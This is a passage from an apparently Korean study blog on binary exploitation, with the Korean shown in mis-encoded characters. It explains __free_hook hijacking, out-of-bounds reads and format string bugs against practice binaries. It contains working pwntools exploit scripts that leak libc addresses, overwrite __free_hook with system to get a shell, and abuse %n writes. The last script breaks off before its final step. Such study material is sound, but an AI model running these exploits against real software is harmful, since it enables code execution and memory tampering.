<code>main</code> í•¨ìˆ˜ì— break point ë¥¼ ê±¸ê³ , run ëª…ë ¹ìœ¼ë¡œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¨ë‹¤. pwndbg í”ŒëŸ¬ê·¸ì¸ì´ ì„¤ì¹˜ëœ gdbë¼ë©´ <code>bt</code> ëª…ë ¹ìœ¼ë¡œ stack ìƒ <code>main</code> í•¨ìˆ˜ì˜ return address ê°€ í™•ì¸ëœë‹¤.</li><li>ì´ return address ë¥¼ <code>x &lt;ì£¼ì†Œ></code> ëª…ë ¹ìœ¼ë¡œ í™•ì¸í•˜ë©´ <code>__libc_start_main</code> + Î± (ì„ì˜ì˜ ê°’) ìœ¼ë¡œ í‘œì‹œëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</li></ul></li><li><code>readelf -s</code> ëª…ë ¹ìœ¼ë¡œ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ <code>__libc_start_main</code> í•¨ìˆ˜ì˜ offset ì„ í™•ì¸í•œë‹¤.</li><li>ìœ„ì—ì„œ ì–»ì–´ë‚¸ ê²°ê³¼ë“¤ë¡œ ì•„ë˜ ê³„ì‚°ì‹ì„ í†µí•´ <code>libc_base</code> ì˜ ì£¼ì†Œë¥¼ ì–»ì–´ë‚¸ë‹¤.<ul><li>(<code>main</code> í•¨ìˆ˜ì˜ return address) - (<code>__libc_start_main</code> í•¨ìˆ˜ì˜ offset) - Î± = <code>libc_base</code></li></ul></li></ul></li><li><p><code>system</code> í•¨ìˆ˜ì™€ <code>__free_hook</code> í•¨ìˆ˜ë¥¼ ì¹˜í™˜í•œë‹¤.</p><ul><li><code>__free_hook</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ë©´ <code>system</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë„ë¡ hook í•¨ìˆ˜ ì£¼ì†Œë¥¼ ë³€ê²½í•œë‹¤.</li></ul></li></ol><ul><li>ì •ë¦¬í•˜ìë©´<ul><li>ì¡°ê±´:<ol><li>buffer overflowê°€ ë°œìƒí•œë‹¤.</li><li>í”„ë¡œê·¸ë¨ì˜ ë°”ì´ë„ˆë¦¬ê°€ í•„ìš”í•˜ë‹¤.</li><li>í”„ë¡œê·¸ë¨ì—ì„œ <code>free</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³ , <code>free</code> í•¨ìˆ˜ì˜ ì¸ìë¥¼ í‘œì¤€ ì…ë ¥ìœ¼ë¡œ ë°›ëŠ”ë‹¤.</li><li>í”„ë¡œê·¸ë¨ì—ì„œ ì„ì˜ ì£¼ì†Œì— ì„ì˜ ê°’ì„ ë®ì–´ì“´ë‹¤.<pre tabindex=0><code>scanf(&#34;%llu&#34;, &amp;value);
*addr = value;
</code></pre><ul><li>got ë¥¼ ìˆ˜ì •í•  ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ROP ì™€ ë¹„êµí–ˆì„ ë•Œ ì¡°ê±´ì´ í•˜ë‚˜ ë” ì¶”ê°€ëœë‹¤.</li></ul></li><li>main í•¨ìˆ˜ì˜ <code>stack frame</code> ì˜ <code>return address</code> ì¶”ì¶œì´ ê°€ëŠ¥í•´ì•¼ í•œë‹¤.<ul><li><code>libc_base</code> ë¥¼ í™•ì¸í•˜ëŠ”ë° ì‚¬ìš©í•˜ë¯€ë¡œ, ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ ëŒ€ì²´ ê°€ëŠ¥</li></ul></li><li>í”„ë¡œê·¸ë¨ì— ì‚¬ìš©ëœ libc ë¼ì´ë¸ŒëŸ¬ë¦¬ê°€ í•„ìš”í•˜ë‹¤.</li></ol></li><li>ë‹¨ê³„:<ol><li>ë°”ì´ë„ˆë¦¬ë¥¼ <code>gdb</code> ë¡œ ë¶„ì„í•˜ì—¬ <code>main</code> í•¨ìˆ˜ê°€ <code>__libc_start_main</code> í•¨ìˆ˜ì˜ ëª‡ ë²ˆì§¸ ë¼ì¸ì—ì„œ í˜¸ì¶œë˜ëŠ”ì§€ í™•ì¸í•œë‹¤.</li><li>í”„ë¡œê·¸ë¨ì˜ ELF ë¥¼ í™•ì¸í•˜ì—¬ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¤ê³ , buffer overflowë¡œ main í•¨ìˆ˜ì˜ stack frame ì—ì„œ return address ê°’ì„ ì¶œë ¥ì‹œí‚¨ë‹¤.</li><li>ì¶œë ¥ëœ ì£¼ì†Œê°’ìœ¼ë¡œ libc_base ë¥¼ êµ¬í•œë‹¤.</li><li>libc_base ê°’ìœ¼ë¡œ <code>system</code>, <code>__free_hok</code> í•¨ìˆ˜ì™€ <code>"/bin/sh"</code> ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ êµ¬í•œë‹¤.</li><li>ì¡°ê±´ (4) ì— í•´ë‹¹í•˜ëŠ”, &lsquo;í‘œì¤€ì…ë ¥&rsquo; ì„ ë°›ëŠ” ì½”ë“œì—ì„œ <code>__free_hook</code> í•¨ìˆ˜ì˜ symbol ì£¼ì†Œì— <code>system</code> í•¨ìˆ˜ì˜ symbol ì£¼ì†Œë¥¼ ëŒ€ì…í•œë‹¤.</li><li>í”„ë¡œê·¸ë¨ì—ì„œ í˜¸ì¶œëœ <code>free</code> í•¨ìˆ˜ì˜ ì¸ìì— <code>"/bin/sh"</code> ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ëŒ€ì…í•œë‹¤.</li></ol></li></ul></li></ul><h5 id=exploit-ì˜ˆì‹œ>exploit ì˜ˆì‹œ<a hidden class=anchor aria-hidden=true href=#exploit-ì˜ˆì‹œ>#</a></h5><pre tabindex=0><code>from pwn import *

p = process(&#39;./fho&#39;)
e = ELF(&#39;./fho&#39;)
libc = ELF(&#39;./libc-2.27.so&#39;)

BUF_SIZE = 0x30

##########
# 1. leak memory of &#39;main&#39; function
##########
payload = b&#39;A&#39; * (BUF_SIZE + 8 + 8 + 8) # BUFFER + other local variable + canary + SFP
p.sendafter(&#39;Buf: &#39;, payload)

print(p.recvuntil(payload))  # payload ê°’ ë²„ë¦¬ê¸°
addr_main_return = u64(p.recvn(6).ljust(8,b&#39;\x00&#39;))  # main í•¨ìˆ˜ì˜ stack frame ì˜ return ì£¼ì†Œ

##########
# 2. calculate offsets of &#39;__libc_start_main&#39; function
##########
# gdb ì—ì„œ í™•ì¸ í•œ main í•¨ìˆ˜ì˜ __libc_start_main ì—ì„œì˜ offset ì€ 231 ì´ë‹¤
# 0x7ffff7a03c87 &lt;__libc_start_main+231&gt;:      mov    edi,eax

OFFSET_MAIN = 231 
ADDR_LIBC_START_MAIN = addr_main_return - OFFSET_MAIN  # __libc_start_main í•¨ìˆ˜ì˜ ì£¼ì†Œ

# readelf -s ëª…ë ¹ìœ¼ë¡œ í™•ì¸í•œ __libc_start_main ì˜ offset ì€ 0x021b10 ì˜€ë‹¤.
# 2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
# OFFSET_LIBC_START_MAIN = libc.symbols[&#39;__libc_start_main&#39;]
OFFSET_LIBC_START_MAIN = 0x21b10
libc_base = ADDR_LIBC_START_MAIN - OFFSET_LIBC_START_MAIN
addr_system = libc.symbols[&#39;system&#39;] + libc_base  # libc_base ì— offset í•©ì‚°
addr_free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]  # libc_base ì— offset í•©ì‚°
addr_bin_sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))  # libcì— ìœ„ì¹˜í•œ &#34;/bin/sh&#34; ë¬¸ìì—´ì˜ ìœ„ì¹˜ ì¶”ì¶œ í›„ ì£¼ì†Œ ê³„ì‚°

print(&#39;libc_base:&#39;, hex(libc_base),  &#39;\naddr_free_hook:&#39;, hex(addr_free_hook), &#39;\naddr_system:&#39;, hex(addr_system), &#39;\naddr_bin_sh:&#39;, hex(addr_bin_sh))


##########
# 3. get shell
##########

# stack ì— ê°’ì„ ì§ì ‘ ì±„ì›Œë„£ì„ë•ŒëŠ” p64() í•¨ìˆ˜ë¡œ íŒ¨í‚¤ì§•ì„ í•œ binary ë°ì´í„°ë¥¼ ì „ë‹¬í—€ì§€ë§Œ,
# í”„ë¡œê·¸ë¨ì—ì„œ ì •ìƒì ìœ¼ë¡œ ë³€ìˆ˜ì— ê°’ì„ ì§‘ì–´ê²Œ í•  ë•ŒëŠ” string í˜•íƒœë¡œ ë³€í™˜í•´ì•¼ í•œë‹¤

input1 = str(addr_free_hook).encode()
print(p.recvuntil(&#39;To write: &#39;))
p.sendline(input1)  # input1
input2 = str(addr_system).encode()
print(p.recvuntil(&#39;With: &#39;))
p.sendline(input2)  # input2
# ì½”ë“œìƒ input1(__free_hook) ì˜ ì£¼ì†Œë¥¼ input2(system) ì˜ ì£¼ì†Œë¡œ ë³€ê²½ì‹œì¼œì¤Œ

input3 = str(addr_bin_sh).encode()
print(p.recvuntil(&#39;To free:&#39;))
p.sendline(input3)  # __free_hook í•¨ìˆ˜ëŠ” __free_hook(arg1) í˜•íƒœë¡œ ë™ì‘í•˜ë¯€ë¡œ, arg1 ì— &#34;bin/sh&#34; ë¥¼ ë„£ì–´ì„œ system(&#34;/bin/sh&#34;) ë¥¼ ë§Œë“ ë‹¤.

p.interactive()
</code></pre><h3 id=out-of-bound>Out Of Bound<a hidden class=anchor aria-hidden=true href=#out-of-bound>#</a></h3><ul><li>C ì–¸ì–´ì—ì„œëŠ” ë°°ì—´ì„ ì°¸ì¡°í•  ë•Œ <code>[]</code> ì—°ì‚°ìë¥¼ ì‚¬ìš©í•œë‹¤.</li><li>í•˜ì§€ë§Œ C ì–¸ì–´ ì»´íŒŒì¼ëŸ¬ëŠ” <code>[]</code> ì—°ì‚°ì ì‚¬ìš©ì‹œ ë°°ì—´ì˜ ë²”ìœ„ë¥¼ ë²—ì–´ë‚¬ëŠ”ì§€ ì²´í¬í•˜ì§€ ì•Šê³ , boundary check ëŠ” ì˜¤ì§ ê°œë°œìì˜ ëª«ì´ë‹¤.</li><li><code>[]</code> ì—°ì‚°ì ì‚¬ìš©ì‹œ boundary check ê°€ ë¯¸í¡í•œ ì½”ë“œê°€ ìˆë‹¤ë©´, boundary ë¥¼ ë²—ì–´ë‚˜ëŠ” index ë¥¼ ë„£ì–´ ì½”ë“œì˜ íŠ¹ì • ë©”ëª¨ë¦¬ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆê³ , ì´ëŸ¬í•œ ê³µê²©ì„ <code>OOB</code>(out of bound) ë¼ í•œë‹¤.</li><li>ì˜ˆë¥¼ ë“¤ì–´, ì•„ë˜ ì½”ë“œë¥¼ ì‹¤í–‰í•œë‹¤ê³  í•˜ì.<pre tabindex=0><code>char* secret = &#34;SECRET KEY&#34;;
char[] arr = {&#34;name&#34;, &#34;age&#34;, &#34;phone&#34;, &#34;address&#34;};
int idx;

scanf(&#34;%d&#34;, &amp;idx);
printf(&#34;%s&#34;, arr[idx]);
</code></pre><ul><li>ë³€ìˆ˜ <code>idx</code> ì— ëŒ€í•œ boundary check ê°€ ë˜ì–´ìˆì§€ ì•Šì•„ idx ê°’ì„ ì›í•˜ëŠ” ëŒ€ë¡œ ë„£ì–´ ê°™ì€ ì£¼ë³€ì˜ ë©”ëª¨ë¦¬ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆê²Œ ëœë‹¤.</li><li>ì‹¤í–‰ ë  ë•Œ stack ì„ ì˜ˆë¡œ ë“¤ë©´ ì•„ë˜ì™€ ê°™ì€ í˜•íƒœê°€ ë  ê²ƒì´ë‹¤.<pre tabindex=0><code>01:0008â”‚-038 0x7fffffffdec8 â€”â–¸ 0x555555558040 (secret) â—‚â€” &#39;SECRET KEY\n&#39;
02:0010â”‚-030 0x7fffffffded0 â€”â–¸ 0x55555555602d â—‚â€” &#39;name&#39;
03:0018â”‚-028 0x7fffffffded8 â€”â–¸ 0x555555556041 â—‚â€” &#39;age&#39;
04:0020â”‚-020 0x7fffffffdee0 â€”â–¸ 0x55555555604d â—‚â€” &#39;phone&#39;
05:0028â”‚-018 0x7fffffffdee8 â€”â–¸ 0x55555555605b â—‚â€” &#39;address&#39;
</code></pre></li><li><code>arr[0]</code> ì€ <code>0x7fffffffded0</code> ì£¼ì†Œì— í•´ë‹¹í•˜ê³ , <code>arr[-1]</code>ì€ <code>0x555555558040</code> ì£¼ì†Œì— í•´ë‹¹í•˜ëŠ” ê°’ì„ ë°˜í™˜ í•œë‹¤.</li><li>idx ì— -1 ì„ ë„£ìœ¼ë©´ ê°œë°œìê°€ ì˜ë„í•˜ì§€ ì•Šì€ ë³€ìˆ˜ ê°’ì¸ <code>secret</code> ë³€ìˆ˜ì˜ ê°’ &ldquo;SECRET KEY&rdquo; ë¬¸ìì—´ì´ ì¶œë ¥ë˜ê²Œ í•  ìˆ˜ ìˆë‹¤.</li></ul></li></ul><h3 id=fsb-format-string-bug>FSB (Format String Bug)<a hidden class=anchor aria-hidden=true href=#fsb-format-string-bug>#</a></h3><ul><li>C ì–¸ì–´ì—ì„œ ë¬¸ìì—´ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ ì¤‘ fë¡œ ëë‚˜ëŠ” í•¨ìˆ˜ë“¤ì€ ëŒ€ë¶€ë¶„ <code>format string</code> ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.</li><li><code>format string</code> ì´ë€, %d %s %u ì²˜ëŸ¼ ë¬¸ìì—´ì— ë³€ìˆ˜ë¥¼ íŠ¹ì • í˜•ì‹ìœ¼ë¡œ ë§¤í•‘ í•´ ë†“ì€ í˜•íƒœë¥¼ ì˜ë¯¸í•œë‹¤.</li><li><code>format string</code> ì„ ì²˜ë¦¬í•˜ëŠ” í•¨ìˆ˜ëŠ” <code>format string</code> ì´ í•„ìš”ë¡œ í•˜ëŠ” ë³€ìˆ˜ì˜ ê°¯ìˆ˜ë¥¼ í™•ì¸í•˜ëŠ” ê³¼ì •ì´ ë³„ë„ë¡œ ì—†ì–´, í•´ì»¤ë“¤ì´ ì´ë¥¼ ì´ìš©í•´ ì˜ë„í•˜ì§€ ì•Šì€ ë³€ìˆ˜ë“¤ì„ ì¶”ê°€ë¡œ ì¶œë ¥/ì…ë ¥ í•˜ë„ë¡ ì¡°ì‘í•  ì—¬ì§€ë¥¼ ë§Œë“ ë‹¤.</li></ul><ol><li>printf ë¥¼ í†µí•œ exploit</li></ol><ul><li>ì¡°ê±´:<ul><li><code>printf(ë³€ìˆ˜)</code> í˜•íƒœì˜ <code>printf</code> êµ¬ë¬¸ (argumentê°€ í•œê°œ)</li><li>ì·¨ì•½í•œ <code>printf</code> êµ¬ë¬¸ì´ ë‘ ë²ˆ ì´ìƒ í˜¸ì¶œë˜ì–´ì•¼ í•¨</li><li>í”„ë¡œê·¸ë¨ì˜ ë°”ì´ë„ˆë¦¬ ìˆì–´ì•¼ í•¨</li></ul></li><li>printf í•¨ìˆ˜ëŠ” ì¶œë ¥ì„ ìœ„í•œ í•¨ìˆ˜ì´ì§€ë§Œ, <code>%n</code> í˜•íƒœì˜ format string ì„ ì‚¬ìš©í•˜ë©´ ì…ë ¥ë„ ë°›ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤.</li><li>exploit ì ˆì°¨ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.<ol><li><p><code>gdb</code> ë¥¼ ì‚¬ìš©í•´ ë°”ì´ë„ˆë¦¬ë¥¼ ë¶„ì„í•˜ì—¬ ELF ë¡œ ëœë¤í•˜ê²Œ ë°°ì •ëœ ì½”ë“œ ì˜ì—­ì˜ base ì£¼ì†Œë¥¼ í™•ì¸í•˜ê³  <code>main</code> í•¨ìˆ˜ì˜ ì‹œì‘ offset ì„ êµ¬í•œë‹¤.</p><ul><li><p><code>vmmap</code> ëª…ë ¹ì–´ë¡œ ë©”ëª¨ë¦¬ ì˜ì—­ì„ ì¶œë ¥ í–ˆì„ ë•Œ, ë©”ëª¨ë¦¬ìƒ ì½”ë“œ ì˜ì—­ì˜ ì‹œì‘ë¶€ë¶„ì„ í™•ì¸í•œë‹¤. (ì•„ë˜ ì˜ˆì‹œì—ì„œëŠ” <code>0x555555554000</code> ì— í•´ë‹¹)</p><pre tabindex=0><code>              Start                End Perm     Size Offset File
  0x555555554000     0x555555555000 r--p     1000      0 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555555000     0x555555556000 r-xp     1000   1000 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555556000     0x555555557000 r--p     1000   2000 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555557000     0x555555558000 r--p     1000   2000 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555558000     0x555555559000 rw-p     1000   3000 /home/aswinblue/download/fsb/fsb_overwrite
  0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
  0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
</code></pre></li><li><p><code>start</code> ëª…ë ¹ìœ¼ë¡œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¤ë©´ <code>main</code> í•¨ìˆ˜ì˜ ì£¼ì†Œê°€ í™•ì¸ëœë‹¤. (ì•„ë˜ ì˜ˆì‹œì—ì„œëŠ” <code>0x555555555290</code>)</p><pre tabindex=0><code>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–º 0x555555555290 &lt;main&gt;       endbr64
  0x555555555294 &lt;main+4&gt;     push   rbp
  0x555555555295 &lt;main+5&gt;     mov    rbp, rsp
</code></pre></li><li><p>ì•ì„œ <code>vmmap</code> ëª…ë ¹ìœ¼ë¡œ êµ¬í•œ ì½”ë“œ ì˜ì—­ì˜ ì‹œì‘ ì£¼ì†Œ <code>0x555555554000</code> ì™€ <code>main</code> í•¨ìˆ˜ì˜ ì£¼ì†Œ <code>0x555555555290</code> ë¥¼ ëº€ ì°¨ì´ <code>0x1290</code> ê°€ ì½”ë“œ ì˜ì—­ì—ì„œ <code>main</code> í•¨ìˆ˜ì˜ offset ì´ ëœë‹¤.</p></li></ul></li><li><p>ì¶”ì¶œì´ í•„ìš”í•œ target ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ í™•ì¸í•œë‹¤.</p><ul><li>ë¦¬ëˆ…ìŠ¤ ëª…ë ¹ì–´ <code>readelf -s</code> ë¡œ ì¶”ì¶œì´ í•„ìš”í•œ ë³€ìˆ˜ì˜ offset ì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</li><li>ì´ë²ˆ ì˜ˆì‹œì—ì„œëŠ” <code>changeme</code> ê°€ target ë³€ìˆ˜ì´ë‹¤.<pre tabindex=0><code>74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5
75: 000000000000401c     4 OBJECT  GLOBAL DEFAULT   26 changeme
76: 0000000000004010     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
77: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
</code></pre></li><li>target ë³€ìˆ˜ì˜ offset ì€ <code>0x000000000000401c</code> ì´ë¯€ë¡œ (1) ì—ì„œ êµ¬í•œ code_base ì˜ ì£¼ì†Œë¥¼ ë”í•´ì£¼ë©´ target ë³€ìˆ˜ì˜ ì£¼ì†ŒëŠ” <code>0x555555554000</code> + <code>0x401c</code> = <code>0x55555555801c</code> ì´ë‹¤.</li><li>(1) ê³¼ì •ì—ì„œ <code>main</code> í•¨ìˆ˜ì˜ ì‹œì‘ ì£¼ì†Œê°€ <code>0x555555555290</code> ì˜€ìœ¼ë¯€ë¡œ, main í•¨ìˆ˜ì™€ target ë³€ìˆ˜ì˜ ì£¼ì†Œ ì°¨ì´ëŠ” <code>0x2D8C</code> ì´ë‹¤.</li></ul></li><li><p>stack ìƒì—ì„œ main í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ëŠ”ë‹¤.</p><ul><li><code>start</code> ëª…ë ¹ìœ¼ë¡œ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰ì‹œí‚¤ê³  <code>main</code> í•¨ìˆ˜ê°€ <code>printf</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ì‹œì ê¹Œì§€ ì‹¤í–‰ì‹œí‚¨ë‹¤. (<code>printf@plt</code> í˜¸ì¶œ ì§ì „ê¹Œì§€ ì‹¤í–‰í•´ì•¼ í•˜ë©°, <code>disass main</code> ëª…ë ¹ì–´ë¡œ <code>printf@plt</code> í˜¸ì¶œ ë¶€ë¶„ì„ í™•ì¸í•  ìˆ˜ë„ ìˆë‹¤.)</li><li><code>tele</code> ëª…ë ¹ìœ¼ë¡œ ìŠ¤íƒ í”„ë ˆì„ì˜ return address ê°’ì„ í™•ì¸í•´ stack ìƒì— ì…ë ¥ëœ <code>main</code> í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.<pre tabindex=0><code>pwndbg&gt; tele 20
00:0000â”‚ rdi rsi rsp 0x7fffffffdef0 â—‚â€” &#39;aaaaaaaa&#39;
01:0008â”‚-028         0x7fffffffdef8 â€”â–¸ 0x555555555300 (main+112) â—‚â€” add al, ch
02:0010â”‚-020         0x7fffffffdf00 â—‚â€” 0x0
03:0018â”‚-018         0x7fffffffdf08 â€”â–¸ 0x555555555120 (_start) â—‚â€” endbr64
</code></pre></li><li><code>rsp + 8</code> ì˜ì—­ì— main + 112(0x555555555300) ê°€ ë“¤ì–´ìˆìŒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</li><li>target ë³€ìˆ˜ì™€ main í•¨ìˆ˜ëŠ” <code>0x2D8C</code> = <code>11660</code> ë§Œí¼ ì°¨ì´ê°€ ë‚˜ë¯€ë¡œ, <code>rsp + 8</code> ì˜ì—­ì˜ ì£¼ì†Œ <code>0x555555555300</code> ì— <code>11660 - 112</code> ë¥¼ ë”í•˜ë©´ target ë³€ìˆ˜ì˜ ì£¼ì†Œê°€ ëœë‹¤.</li><li>ì¦‰, <code>printf</code> ë¥¼ í˜¸ì¶œí•˜ê¸° ì§ì „ <code>rsp[8] + 11548</code> ê°’ì€ target ë³€ìˆ˜ì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œ ê°’ì´ ë¨ì„ ì•Œ ìˆ˜ ìˆë‹¤.<ul><li><code>ELF</code> ë‚˜ <code>ASLR</code> ì´ ì ìš©ë˜ì–´ë„ í•¨ìˆ˜ ë° ë³€ìˆ˜ì˜ ìƒëŒ€ì ì¸ ì£¼ì†ŒëŠ” ì¼ì •í•˜ë¯€ë¡œ gdb ë¡œ ë¯¸ë¦¬ í™•ì¸í•˜ê³  pwntool ë¡œ ê³µê²©ì´ ê°€ëŠ¥í•˜ë‹¤.</li></ul></li></ul></li><li><p><code>printf</code> ì˜ ì·¨ì•½ì ì„ í™œìš©í•˜ì—¬ í•„ìš”í•œ ë©”ëª¨ë¦¬ ì˜ì—­ì„ ì¶”ì¶œí•œë‹¤.</p><ul><li><code>printf</code> ëŠ” format string ì„ ì²« ë²ˆì§¸ ì¸ì(rdi)ë¡œ ë°›ê³ , ë‘ ë²ˆì§¸ ì´ìƒ ë¶€í„°ëŠ” format string ì—ì„œ í˜¸ì¶œ ë  ë³€ìˆ˜ë“¤ì„ ì¸ìë¡œ ë°›ëŠ”ë‹¤.<ul><li><code>printf("%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p");</code> í˜¸ì¶œì‹œ ê²°ê³¼ëŠ” rsi, rdx, rcx, r8, r9, rsp[0], rsp[0x08], rsp[0x10] ì— ë“¤ì–´ìˆëŠ” ê°’ì´ ì¶œë ¥ëœë‹¤.</li><li><a href=../../computerscience/computer_science/#sysv>PLT/GOT ì°¸ì¡°</a></li></ul></li><li>6ë²ˆì§¸ ë³€ìˆ˜ë¶€í„° stack ì˜ ê°’ì„ ì°¸ì¡°í•˜ë„ë¡ ë˜ì–´ìˆìœ¼ë¯€ë¡œ stack ì— ë“¤ì–´ìˆëŠ” ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ì¶œë ¥í•˜ë„ë¡ í•  ìˆ˜ë„ ìˆê²Œ ëœë‹¤.</li><li><code>rsp[8]</code> ëŠ” <code>printf</code> ìƒì—ì„œ <code>%7$p</code> ì— í•´ë‹¹í•œë‹¤. (ë©”ëª¨ë¦¬ ì£¼ì†Œ ì¶œë ¥ì„ í•´ì•¼í•˜ë¯€ë¡œ &lsquo;%p&rsquo; ë¥¼ ì‚¬ìš©í–ˆë‹¤.)</li><li><code>printf("%7$p");</code> ë¥¼ í˜¸ì¶œí•˜ë„ë¡ ì½”ë“œë¥¼ ì§œê³ , ì¶œë ¥ëœ ê°’ì—ì„œ + <code>11548</code> ì„ ë”í•˜ë©´ target ë³€ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì¶”ì¶œ í•´ ë‚¼ ìˆ˜ ìˆë‹¤.</li></ul></li><li><p><code>printf</code> ì˜ ì·¨ì•½ì ì„ í™œìš©í•˜ì—¬ ë©”ëª¨ë¦¬ ì˜ì—­ì— ê°’ì„ ë®ì–´ì“´ë‹¤.</p><ul><li>ì¶”ì¶œëœ ë©”ëª¨ë¦¬ ì˜ì—­ì— ê°’ì„ ë®ì–´ ì“°ë ¤ë©´, format string ì˜ <code>%n</code> ê¸°ëŠ¥ì„ ì´ìš©í•œë‹¤.<ul><li><code>printf("%s%n");</code> ì€ %s ì—ì„œ ì¶œë ¥ëœ ë¬¸ìì˜ ê¸¸ì´ë§Œí¼ <code>%n</code> ì— ê¸°ë¡í•œë‹¤.</li><li><a href=../../c++/c++/#format-string>printf ì°¸ì¡°</a></li><li>ë²„í¼ì˜ í¬ê¸°ê°€ í¬ì§€ ì•Šì•„ë„ í° ìˆ˜ë¥¼ <code>%n</code> ì— ë‹´ìœ¼ë ¤ë©´ format string ì˜ width ì„¤ì •ì„ ì´ìš©í•œë‹¤.<ul><li><code>printf("%30p")</code> ëŠ” ì¶œë ¥ë˜ëŠ” ê¸¸ì´ê°€ 30 ì´í•˜ë¼ë©´ ëª¨ìë€ ì˜ì—­ì„ ê³µë°±ìœ¼ë¡œ ì±„ìš´ë‹¤.</li></ul></li></ul></li><li>ì¢…í•©í•˜ë©´ 1337 ì„ target ë³€ìˆ˜ì— ë®ì–´ì“°ê³  ì‹¶ë‹¤ë©´, <code>"%1337s%8$n......"</code> ì´í›„ì— <code>target ë³€ìˆ˜ì˜ ì£¼ì†Œ</code> ë¥¼ ì´ì–´ë¶™ì¸ ë¬¸ì¥ì„ printf ê°€ ì¶œë ¥í•˜ê²Œ í•˜ë©´ ëœë‹¤.<ul><li><code>%1337s%8$n</code> ì€ rsp[0x10] ì˜ ì£¼ì†Œì— 1337 ê°’ì„ ë„£ëŠ” ìš©ë„ì´ë‹¤.</li><li><code>......</code> + <code>target ë³€ìˆ˜ì˜ ì£¼ì†Œ</code> ë¶€ë¶„ì€ x64 êµ¬ì¡°ì˜ ì‹œìŠ¤í…œì—ì„œëŠ” <code>rsp</code>[0x10] ìœ„ì¹˜ì— <code>target ë³€ìˆ˜ì˜ ì£¼ì†Œ</code> ê°€ ì˜¤ë„ë¡ íŒ¨ë”©ì„ ë„£ì€ ë¬¸ìì—´ì´ë‹¤.</li><li>í”„ë¡œê·¸ë¨ ìƒì—ì„œ <code>read</code> í•¨ìˆ˜ í˜¸ì¶œì—ì„œ ë°›ì€ ë°ì´í„°ê°€ <code>rsp</code> ì— ìŒ“ì´ê³  <code>printf</code> ë¥¼ í˜¸ì¶œí•  ë•Œ ê¹Œì§€ <code>rsp</code> ì— ìœ ì§€ë¨ì„ <code>gdb</code> ë¡œ í™•ì¸ í–ˆê¸°ì— <code>rsp</code>[0x10] ì— ë°ì´í„°ë¥¼ ë„£ì„ ê³„íšì„ ì„¸ìš´ ê²ƒì´ë‹¤.</li></ul></li></ul></li></ol></li><li>pwntool ì„ ì‚¬ìš©í•œ ì½”ë“œ ì˜ˆì‹œì´ë‹¤.<pre tabindex=0><code>from pwn import *
p = process(&#34;./fsb_overwrite&#34;)
elf = ELF(&#39;./fsb_overwrite&#39;)
##########
# 1. get address of &#39;main + 112&#39; from stack
##########
# send FSB payload
p.sendline(b&#34;%7$p&#34;)
addr_leak = int(p.recvline()[:-1], 16)

##########
# 2. calculate address main+112 in stack
##########
# calculate address of &#39;main&#39; function
addr_main = addr_leak - 112
print(&#39;addr_main:&#39;, hex(addr_main))
# calculate address of target variable &#39;changeme&#39;
# &#39;changeme&#39; is 11660 away from &#39;main&#39;
# addr_changeme = addr_main + 11660
addr_changeme = addr_main + (elf.symbols[&#39;changeme&#39;] - elf.symbols[&#39;main&#39;])

print(&#39;offset main:&#39;, hex(elf.symbols[&#39;main&#39;]))
print(&#39;offset changeme:&#39;, hex(elf.symbols[&#39;changeme&#39;]))
print(&#39;addr_changeme:&#39;, hex(addr_changeme))

##########
# 3. overwrite &#39;changeme&#39; variable 
##########
